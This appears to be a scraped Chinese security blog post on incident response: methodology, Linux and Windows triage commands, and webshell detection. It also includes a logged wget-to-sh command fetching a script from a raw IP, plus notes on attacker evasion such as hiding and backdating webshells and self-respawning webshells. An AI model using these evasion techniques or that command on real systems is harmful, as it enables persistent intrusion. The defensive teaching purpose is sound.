Mapper(网络映射器)”)网络探测和安全审核的工具。\n主机提供什么服务(应用程序名和版本)，\n那些服务运行在什么操作系统(包括版本信息)，\n它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。\nMSF Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具。\nWindows应急响应 https://www.freebuf.com/articles/es/210315.html\rhttps://www.freebuf.com/articles/network/203494.html\r服务流程 沟通确认安全事件 在与客户第一次沟通时，应及时提醒客户对受害机器及时进行断网隔离操作。已知的安全事件包括但不限于如下：\n \\1. 恶意代码威胁，即僵尸网络、恶意木马、蠕虫病毒、勒索病毒等恶意代码导致的安全事件\n\\2. 高级持续性威胁(APT)攻击事件，即具有潜伏性、隐蔽性、目的性、持续性等特点的安全事件\n\\3. 非法入侵事件，包括但不限于业务系统受到入侵致使数据泄露、丢失等；外网网站被入侵，导致网站被恶意篡改植入暗链或出现其他非法的宣传标语；服务器被入侵导致受到勒索攻击等安全事件\n\\4. 漏洞事件，即0day公布；在野漏洞发现；已知漏洞被发现受到通报等安全事件\n\\5. 数据泄露事件，即重要数据因受到了入侵导致的泄露；应用配置不当导致的泄露；员工误操作导致的泄露；内鬼泄露等安全事件\n\\6. 分布式拒绝服务攻击（DDOS）事件，即网站受到了各类DOS攻击，包括但不限于CC攻击、洪水攻击、流量放大攻击等安全事件\n\\7. 流量劫持，DNS劫持、HTTP劫持\n\\8. 其他归于网络安全的事件\n 注意事项：一定要亲自确认，切不可盲目相信他人所述。\n排查角度    是否有异常进程、用户\n  敏感端口开放情况\n  密码强度\n  日志分析\n  5)异常启动项、服务、计划任务\n 注册表信息\n  其它\n   确认后，应尽量收集与本次安全事件相关的信息，例如什麽时候发现的攻击，之前有无出现过安全事件等。\n在确认安全事件后明确应急目的：\n \\1. 病毒、后门清除工作\n\\2. 协助业务系统安全的恢复上线\n\\3. 攻击溯源工作。（仅溯源至攻击者的攻击切入点）\n 现场保护 在与客户沟通时，应提醒客户注意保护现场，千万不要直接重装系统，以方便后续的溯源工作及可能存在的电子取证工作。在处置受害机器时，应尽量保持受害机器的原样，如虚拟机处置时，可以让客户进行快照存储。\n了解客户网络状况 对客户的网络拓扑应尽早进行了解，特别是网络的进出口、负载均衡、防火墙、DNS服务器。\n确定事件影响 确定工作方向\n确立工作目标\n明确现场工作任务归属\n无论现场的环境，主导本次安全事件，合理分配现场工作为应急人员的必备技能。\n对现场的可能存在的工作应具备清晰的认知。通常会存在以下工作内容：病毒分析处置、业务恢复、安全加固、溯源分析、临时需求处置、产品对接与使用、应急指挥与协调。\nLinux应急响应 https://www.freebuf.com/articles/system/218407.html\r概述 Linux环境下处理应急响应事件往往会更加的棘手，因为相比于Windows，Linux没有像Autorun、procexp这样的应急响应利器，也没有统一的应急响应处理流程。所以，这篇文章将会对Linux环境下的应急响应流程进行讲解，并且提供每一个环节中所用到的shell命令，以帮助大家快速、系统化地处理Linux环境下的病毒。\nLinux平台下的恶意软件威胁以僵尸网络蠕虫和挖矿病毒为主，由于Linux大多作为服务器暴露在公网，且Web应用的漏洞层出不穷，所以很容易被大范围入侵，如常见的病毒：DDG、systemdMiner、BillGates、watchdogs、XorDDos，在很多Linux上都有。大家要养成不使用弱密码、勤打补丁的好习惯。\n处理Linux应急响应主要分为这4个环节:识别现象- 清除病毒- 闭环兜底- 系统加固。\n首先从用户场景的主机异常现象出发，先识别出病毒的可疑现象。\n然后定位到具体的病毒进程以及病毒文件，进行清除。\n完成前2步还不够，病毒一般会通过一些自启动项及守护程序进行重复感染，所以我们要执行闭环兜底确保病毒不再被创建。\n将主机上的病毒项清除干净后，最后就是进行系统加固了，防止病毒从Web再次入侵进来。\n走完这4个环节，才能算是一个应急响应流程的结束。\n识别现象 第1个环节要求我们通过系统运行状态、安全设备告警，发现主机异常现象，以及确认病毒的可疑行为。\n系统CPU是否异常\n枚举进程，CPU降序排序：top\nCPU占用率超过70%且名字比较可疑的进程，大概率就是挖矿病毒了。\n是否存在可疑进程\n枚举进程命令行：ps -aux\n病毒一般都携带可疑的命令行，当你发现命令行中带有url等奇怪的字符串时，就要注意了，它很可能是个病毒downloader。\n安全网关有无报警 从安全网关报警中识别出威胁是最直接，但确认主机已经感染了病毒只是第一步，接下来得定位，具体是哪个进程在与C\u0026C通信。\n监控与目标IP通信的进程：\nwhile true; do netstat -antp | grep [ip]; done\n有时安全网关检测到的不全是恶意IP，还有可能是个域名，这种情况下，域名对应的IP是变化的，我们不能直接用上述方法进行监控。\n我们可以先在host文件中添加一条规则，将恶意域名重定向到一个随机的IP地址，然后对其进行监控。\n这样就能得到与之通信的恶意进程了。\n有无可疑历史命令 遍历主机历史命令，查找有无恶意命令：history\n清除病毒 从第1个环节追溯到的进程信息，将会帮助我们定位到病毒进程\u0026病毒文件，实现清除。\n结束病毒进程 清除可疑进程的进程链：\nps -elf | grep [pid] kill -9 [pid]\r删除病毒文件 定位病毒进程对应的文件路径：\nls -al /proc/[pid]/exe rm -f [exe_path]\r闭环兜底 Linux下的病毒持久化驻留方式相比于Windows较少，主要以下4种方式。\n检查是否存在可疑定时任务 枚举定时任务：crontab-l\n查看anacron异步定时任务：cat/etc/anacrontab\n检查是否存在可疑服务 枚举主机所有服务，查看是否有恶意服务：\nservice--status-all\r检查系统文件是否被劫持\n枚举系统文件夹的文件，按修改事件排序查看7天内被修改过的文件：\nfind /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime +7 | xargs ls -la\r检查是否存在病毒守护进程\n监控守护进程的行为：lsof-p[pid]\nstrace-tt-T -etrace=all-p$pid\r扫描是否存在恶意驱动 枚举/扫描系统驱动：lsmod\n安装chkrootkit进行扫描：\nwget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense./chkrootkit\r安装rkhunter进行扫描：\nWgethttps://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c\r最后一个环节往往是大家比较容易遗忘的，Linux平台下90%的病毒是通过网络传播感染的，所以，你的主机之所以会感染病毒，大部分原因也是因为Web安全防护不够，赶紧检查一下。\n修改SSH弱密码\n查询log主机登陆日志：\ngrep \"Accepted \" /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'\r定位有爆破的源IP：\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c\r爆破日志的用户名密码：\ngrep \"Failed password\" /var/log/secure|perl -e 'while($_=){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr\rSSH爆破是Linux病毒最常用的传播手段，若存在弱密码的主机很容易被其他感染主机SSH爆破成功，从而再次感染病毒。\n添加命令审计 为历史的命令增加登录的IP地址、执行命令时间等信息：\n[1]保存1万条命令：\nsed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile\r[2]在/etc/profile的文件尾部添加如下行数配置信息：\nUSER_IP=`who -u am i 2/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ \"$USER_IP\" = \"\" ]thenUSER_IP=`hostname`fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\"\r[3]让配置生效：\nsource /etc/profile\r生成效果：\n762019-10-2817:05:34113.110.229.230 wget -q -T180 -O-http://103.219.112.66:8000/i.sh) | sh\r打上常见Web漏洞补丁  structs2系列RCE漏洞\nthinkphp5.XRCE漏洞\nRedis未授权访问漏洞\nConfluenceRCE漏洞（CVE_2019_3396）\nDrupalRCE漏洞（CVE-2018-7600）\nThinkPHPRCE漏洞（CVE-2019-9082）\n Webshell 一种恶意脚本，其目的是获得服务器的执行操作权限\n检测方式 静态检测 匹配文件特征码、特征值、危险函数eval等来查找webshell 依据特征码弱强特征，结合人工判断，可减少漏报误报概率 利用文件系统的属性判断，无缘无故多出的nobody属性文件必定有问题(Apache是nobody启动)\n弱点: 漏报误报率较高，无法查杀变种及0day型 动态监测 依据webshell文件执行表现的特征即动态特征，如菜刀操作的特征\nwebshell命令执行时必会创建bash或IIS User启动cmd 由PID进程号定位webshell\nhttp异常模型检测，检测若有有用户访问一个从未访问过的文件并得到200响应，很容易定位webshell\n修改内核，hook一些危险函数eval、asset，重新编译php;\n弱点:降低php性能及业务性能\n日志检测 webshell访问特征\n 少量ip发起fangwen 总访问次数少 该页面属于孤立页面  查杀工具 https://blog.csdn.net/qq_23936389/article/details/105445551\nD盾 河马\n权限维持 针对蓝队 其他文件夹写入shell：初次上传路径一般都是存放图片等类型文件的文件夹，如果在这样的文件夹中突然出现一个php后缀的文件，那么十有八九会被发现，所以为了避免被蓝队发现，一般做法是在其他可写的文件夹下写入shell。\n**改写shell的日期：**这个主要针对linux平台，因为linux下webshell查杀工具不多，可能会通过命令去查杀。\n可能的命令是find命令\nfind -name \"*.php\" -type f -mtime -3 -exec ls -l {} \\;\r修改方法是touch命令，比如：\ntouch -d ‘08-August-2019’ rrr.php\n**写入不死马：**所谓不死马，就是常驻内存的木马，通过循环在某路径下生成shell来维持权限，即使删除了shell,还是会生成。\n写入其他后门： 1.写入命令执行后门\n2.图片马结合文件包含脚本：图片马中写入恶意代码，然后在相应位置放置文件包含的漏洞文件，通过访问文件包含漏洞文件去解析图片马，图片马生成shell，然后直接连接。\n反制手段 **现代蜜罐：**除了捕获分析攻击行为外，各类安全厂商在蜜罐产品中加入了“攻击者画像”这一功能作为“卖点”，而本质上攻击者画像是将第三方厂商漏洞转为画像探针，利用第三方厂商漏洞获取攻击者所在此类厂商网站业务上的个人信息，此类漏洞多半为前端类漏洞，例如：JSONP、XSS…除此之外还有网站伪造、自动投放蜜标等等众多丰富的功能。\n所以传统蜜罐厂商在这一块的被“需要”不大，而现代蜜罐厂商在这一块往往有需要性很多，就冲“攻击者画像”这一方面在演习过程中就可以为防守方加分。\n蜜罐的反制 现代化蜜罐都做了哪些反制的操作呢？\n 可克隆相关系统页面，伪装“漏洞”系统 互联网端投饵，一般会在Github、Gitee、Coding上投放蜜标（有可能是个单独的网站地址、也有可能是个密码本引诱中招） 利用JSONP、XSS、CSRF等前端类漏洞获取访问蜜标的攻击者网络身份（网络画像）  主动攻击“攻击IP” 防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在VPS上，因此我们可以结合流量监测平台反向扫描\n溯源反制 https://www.secrss.com/articles/27611\n1、没有对附件文件进行逆向分析，看是调试信息中包含了物理路径信息。\n2、没有利用社工库进一步挖掘到攻击者的真实身份信息\n3、报告中缺少对软件行为的细致分析。\n4、钓鱼邮件完全可以将计就计，建个QQ群骗出对方的木马文件、钓鱼链接。从而进一步进行溯源分析。\n0day储备 对于防守方来说，从行为检测上看，其实0day并没有那么可怕，即使遭遇0day攻击，主机上的对抗也会回到基本面上，比如：Webshell、恶意命令、反弹Shell、端口扫描、黑客工具、端口转发、提权、C2通信等等，这里就要求防守方超越IoC和传统黑特征的束缚，不依赖对特定漏洞利用的先验知识，而全面基于行为数据进行建模，从而拥有发现和识别通过未知漏洞突破的恶意活动检测能力。对于完善的纵深防御体系来说，抓住端点上的蛛丝马迹，可能在攻击者尝试执行探测命令时就可以告警了，甚至可以用蜜罐捕获0day。攻击队的0day利用也需要深思熟虑，识别绕过蜜罐，并尽量趋向于合法操作，比如添加账号，而不是执行黑命令或者直接反弹Shell。\n高效的“检测”与“响应”能力\n开发阶段预防\n坑 应急人员需要保持清醒的头脑，冷静处理问题。整个应急流程中要注意：\n一、多和客户进行交流，询问运维人员及其他人员在事件发生后所做的操作是什么；\n二、询问客户部署有哪些安全设备有哪些，安全设备能够帮助应急人员少走很多弯路；\n三、遇到特殊操作，需获得客户授权，经用户授权后再进行处置；\n四、整个处置过程中，发现的异常问题及时上报并截图留存处置细节(最好带有时间戳)；\n五、整个处置过程中遇到的恶意病毒样本需要在桌面等位置建立相关文件夹，把恶意文件存放在桌面上，以便后续取出分析；\n数据储备 此时，全网数据和被动信息搜集就会变得非常有价值，比如DNS历史解析记录、Whois历史信息、历史端口开放情况、网络流量信息等等，这些数据可以帮助你：\n 找出网站真实IP，挖掘相邻网段、绕过安全设备 判断目标是否为蜜罐 定位内网IP和系统 定位关键的应用系统  ",
  "wordCount" : "484",
  "inLanguage": "en",
  "datePublished": "2021-04-15T15:07:34+08:00",
  "dateModified": "2021-04-15T15:07:34+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://inten.kro1lsec.com/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "intenのblog🍦",
    "logo": {
      "@type": "ImageObject",
      "url": "https://inten.kro1lsec.com/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>
<noscript>
    <style type="text/css">
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: #1d1e20;
                --entry: #2e2e33;
                --primary: rgba(255, 255, 255, 0.84);
                --secondary: rgba(255, 255, 255, 0.56);
                --tertiary: rgba(255, 255, 255, 0.16);
                --content: rgba(255, 255, 255, 0.74);
                --hljs-bg: #2e2e33;
                --code-bg: #37383e;
                --border: #333;
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://inten.kro1lsec.com/" accesskey="h" title="intenのblog🍦 (Alt + H)">intenのblog🍦</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://inten.kro1lsec.com/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://inten.kro1lsec.com/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://inten.kro1lsec.com/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      应急响应
    </h1>
    <div class="post-meta">April 15, 2021&nbsp;·&nbsp;3 min
</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <div class="details">Table of Contents</div>
        </summary>
        <div class="inner"><ul>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e8%ae%ba" aria-label="方法论">方法论</a><ul>
                        
                <li>
                    <a href="#%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e6%96%b9%e5%bc%8f" aria-label="应急响应方式">应急响应方式</a></li>
                <li>
                    <a href="#%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e6%b5%81%e7%a8%8b" aria-label="应急响应流程">应急响应流程</a><ul>
                        
                <li>
                    <a href="#pdcerf%e6%96%b9%e6%b3%95%e5%ad%a6" aria-label="PDCERF方法学">PDCERF方法学</a><ul>
                        
                <li>
                    <a href="#%e5%87%86%e5%a4%87%e9%98%b6%e6%ae%b5" aria-label="准备阶段">准备阶段</a></li>
                <li>
                    <a href="#%e6%a3%80%e6%b5%8b%e9%98%b6%e6%ae%b5" aria-label="检测阶段">检测阶段</a></li>
                <li>
                    <a href="#%e6%8a%91%e5%88%b6%e9%98%b6%e6%ae%b5" aria-label="抑制阶段">抑制阶段</a></li>
                <li>
                    <a href="#%e6%a0%b9%e9%99%a4%e9%98%b6%e6%ae%b5" aria-label="根除阶段">根除阶段</a></li>
                <li>
                    <a href="#%e6%81%a2%e5%a4%8d%e9%98%b6%e6%ae%b5" aria-label="恢复阶段">恢复阶段</a></li>
                <li>
                    <a href="#%e8%b7%9f%e8%b8%aa%e9%98%b6%e6%ae%b5" aria-label="跟踪阶段">跟踪阶段</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%b8%b8%e8%a7%84%e6%b5%81%e7%a8%8b" aria-label="常规流程">常规流程</a></li>
                <li>
                    <a href="#%e7%b3%bb%e7%bb%9f%e6%97%a5%e5%bf%97%e5%8f%8a%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" aria-label="系统日志及日志分析">系统日志及日志分析</a></li>
                <li>
                    <a href="#%e6%97%a5%e5%bf%97%e7%b1%bb%e5%9e%8b" aria-label="日志类型">日志类型</a></li>
                <li>
                    <a href="#%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5%e7%9a%84%e4%bd%9c%e7%94%a8" aria-label="威胁情报的作用">威胁情报的作用</a></li>
                <li>
                    <a href="#%e5%9f%9f%e5%90%8d" aria-label="域名">域名</a><ul>
                        
                <li>
                    <a href="#%e9%9a%8f%e6%9c%ba%e5%9f%9f%e5%90%8ddga" aria-label="随机域名（DGA）：">随机域名（DGA）：</a></li>
                <li>
                    <a href="#%e5%8a%a8%e6%80%81%e5%9f%9f%e5%90%8d" aria-label="动态域名：">动态域名：</a></li>
                <li>
                    <a href="#%e8%bf%91%e6%9c%9f%e5%9f%9f%e5%90%8d" aria-label="近期域名：">近期域名：</a></li>
                <li>
                    <a href="#%e6%9a%97%e7%bd%91%e4%bb%a3%e7%90%86%e5%9f%9f%e5%90%8d" aria-label="暗网代理域名：">暗网代理域名：</a></li>
                <li>
                    <a href="#%e9%a1%b6%e7%ba%a7%e5%9f%9f%e5%90%8d" aria-label="顶级域名：">顶级域名：</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%b8%b8%e8%a7%81%e7%97%85%e6%af%92%e5%8f%8a%e5%88%86%e7%b1%bb" aria-label="常见病毒及分类">常见病毒及分类</a></li>
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e5%92%8c%e8%a1%a5%e4%b8%81" aria-label="漏洞和补丁">漏洞和补丁</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%b7%a5%e5%85%b7" aria-label="工具">工具</a><ul>
                        <ul>
                        
                <li>
                    <a href="#nmap" aria-label="Nmap">Nmap</a></li>
                <li>
                    <a href="#msf" aria-label="MSF">MSF</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#windows%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94" aria-label="Windows应急响应">Windows应急响应</a><ul>
                        <ul>
                        
                <li>
                    <a href="#%e6%9c%8d%e5%8a%a1%e6%b5%81%e7%a8%8b" aria-label="服务流程"><strong>服务流程</strong></a><ul>
                        
                <li>
                    <a href="#%e6%b2%9f%e9%80%9a%e7%a1%ae%e8%ae%a4%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6" aria-label="沟通确认安全事件"><strong>沟通确认安全事件</strong></a><ul>
                        
                <li>
                    <a href="#%e6%8e%92%e6%9f%a5%e8%a7%92%e5%ba%a6" aria-label="排查角度">排查角度</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%8e%b0%e5%9c%ba%e4%bf%9d%e6%8a%a4" aria-label="现场保护"><strong>现场保护</strong></a></li>
                <li>
                    <a href="#%e4%ba%86%e8%a7%a3%e5%ae%a2%e6%88%b7%e7%bd%91%e7%bb%9c%e7%8a%b6%e5%86%b5" aria-label="了解客户网络状况"><strong>了解客户网络状况</strong></a></li>
                <li>
                    <a href="#%e7%a1%ae%e5%ae%9a%e4%ba%8b%e4%bb%b6%e5%bd%b1%e5%93%8d" aria-label="确定事件影响"><strong>确定事件影响</strong></a></li></ul>
                </li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#linux%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94" aria-label="Linux应急响应">Linux应急响应</a><ul>
                        
                <li>
                    <a href="#%e6%a6%82%e8%bf%b0" aria-label="概述">概述</a></li>
                <li>
                    <a href="#%e8%af%86%e5%88%ab%e7%8e%b0%e8%b1%a1" aria-label="识别现象">识别现象</a><ul>
                        
                <li>
                    <a href="#%e5%ae%89%e5%85%a8%e7%bd%91%e5%85%b3%e6%9c%89%e6%97%a0%e6%8a%a5%e8%ad%a6" aria-label="安全网关有无报警">安全网关有无报警</a></li>
                <li>
                    <a href="#%e6%9c%89%e6%97%a0%e5%8f%af%e7%96%91%e5%8e%86%e5%8f%b2%e5%91%bd%e4%bb%a4" aria-label="有无可疑历史命令">有无可疑历史命令</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%b8%85%e9%99%a4%e7%97%85%e6%af%92" aria-label="清除病毒">清除病毒</a><ul>
                        
                <li>
                    <a href="#%e7%bb%93%e6%9d%9f%e7%97%85%e6%af%92%e8%bf%9b%e7%a8%8b" aria-label="结束病毒进程">结束病毒进程</a></li>
                <li>
                    <a href="#%e5%88%a0%e9%99%a4%e7%97%85%e6%af%92%e6%96%87%e4%bb%b6" aria-label="删除病毒文件">删除病毒文件</a></li></ul>
                </li>
                <li>
                    <a href="#%e9%97%ad%e7%8e%af%e5%85%9c%e5%ba%95" aria-label="闭环兜底">闭环兜底</a><ul>
                        
                <li>
                    <a href="#%e6%a3%80%e6%9f%a5%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e5%8f%af%e7%96%91%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1" aria-label="检查是否存在可疑定时任务">检查是否存在可疑定时任务</a></li>
                <li>
                    <a href="#%e6%a3%80%e6%9f%a5%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e5%8f%af%e7%96%91%e6%9c%8d%e5%8a%a1" aria-label="检查是否存在可疑服务">检查是否存在可疑服务</a></li>
                <li>
                    <a href="#%e6%89%ab%e6%8f%8f%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e6%81%b6%e6%84%8f%e9%a9%b1%e5%8a%a8" aria-label="扫描是否存在恶意驱动">扫描是否存在恶意驱动</a></li>
                <li>
                    <a href="#%e6%b7%bb%e5%8a%a0%e5%91%bd%e4%bb%a4%e5%ae%a1%e8%ae%a1" aria-label="添加命令审计">添加命令审计</a></li>
                <li>
                    <a href="#%e6%89%93%e4%b8%8a%e5%b8%b8%e8%a7%81web%e6%bc%8f%e6%b4%9e%e8%a1%a5%e4%b8%81" aria-label="打上常见Web漏洞补丁">打上常见Web漏洞补丁</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#webshell" aria-label="Webshell"><strong>Webshell</strong></a><ul>
                        
                <li>
                    <a href="#%e6%a3%80%e6%b5%8b%e6%96%b9%e5%bc%8f" aria-label="检测方式">检测方式</a><ul>
                        
                <li>
                    <a href="#%e6%9f%a5%e6%9d%80%e5%b7%a5%e5%85%b7" aria-label="查杀工具">查杀工具</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" aria-label="权限维持">权限维持</a><ul>
                        
                <li>
                    <a href="#%e9%92%88%e5%af%b9%e8%93%9d%e9%98%9f" aria-label="针对蓝队">针对蓝队</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%8f%8d%e5%88%b6%e6%89%8b%e6%ae%b5" aria-label="反制手段">反制手段</a><ul>
                        <ul>
                        
                <li>
                    <a href="#%e8%9c%9c%e7%bd%90%e7%9a%84%e5%8f%8d%e5%88%b6" aria-label="蜜罐的反制">蜜罐的反制</a></li>
                <li>
                    <a href="#%e4%b8%bb%e5%8a%a8%e6%94%bb%e5%87%bb%e6%94%bb%e5%87%bbip" aria-label="主动攻击“攻击IP”">主动攻击“攻击IP”</a></li>
                <li>
                    <a href="#%e6%ba%af%e6%ba%90%e5%8f%8d%e5%88%b6" aria-label="溯源反制">溯源反制</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#0day%e5%82%a8%e5%a4%87" aria-label="0day储备">0day储备</a></li>
                <li>
                    <a href="#%e5%9d%91" aria-label="坑">坑</a></li>
                <li>
                    <a href="#%e6%95%b0%e6%8d%ae%e5%82%a8%e5%a4%87" aria-label="数据储备">数据储备</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a>
应急响应笔记</p>
<p><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12234762.html">https://www.cnblogs.com/H4ck3R-XiX/p/12234762.html</a>
Nmap使用教程（进阶篇）</p>
<h2 id="方法论">方法论<a hidden class="anchor" aria-hidden="true" href="#方法论">#</a></h2>
<p>浅谈我所理解的应急响应流程</p>
<pre><code>https://www.freebuf.com/column/193690.html
</code></pre><p>应急响应的整体思路和基本流程</p>
<pre><code>https://www.freebuf.com/articles/terminal/192859.html
</code></pre><h3 id="应急响应方式">应急响应方式<a hidden class="anchor" aria-hidden="true" href="#应急响应方式">#</a></h3>
<p>现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。
远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。</p>
<h3 id="应急响应流程">应急响应流程<a hidden class="anchor" aria-hidden="true" href="#应急响应流程">#</a></h3>
<p>业内通常使用的</p>
<h4 id="pdcerf方法学">PDCERF方法学<a hidden class="anchor" aria-hidden="true" href="#pdcerf方法学">#</a></h4>
<p><strong>准备阶段——&gt;检测阶段——&gt;抑制阶段——&gt;根除阶段——&gt;恢复阶段——&gt;跟踪总结</strong></p>
<h5 id="准备阶段">准备阶段<a hidden class="anchor" aria-hidden="true" href="#准备阶段">#</a></h5>
<p>准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。</p>
<p>准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。</p>
<h5 id="检测阶段">检测阶段<a hidden class="anchor" aria-hidden="true" href="#检测阶段">#</a></h5>
<p>检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。</p>
<p>检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。</p>
<p><strong>备注：事件类型分类</strong></p>
<p>安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。
（1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。
（2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。
（3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。
（4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。
（5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。
（6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。
（7）其他事件是指不能归为以上分类的网络安全事件</p>
<h5 id="抑制阶段">抑制阶段<a hidden class="anchor" aria-hidden="true" href="#抑制阶段">#</a></h5>
<p>采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。</p>
<h5 id="根除阶段">根除阶段<a hidden class="anchor" aria-hidden="true" href="#根除阶段">#</a></h5>
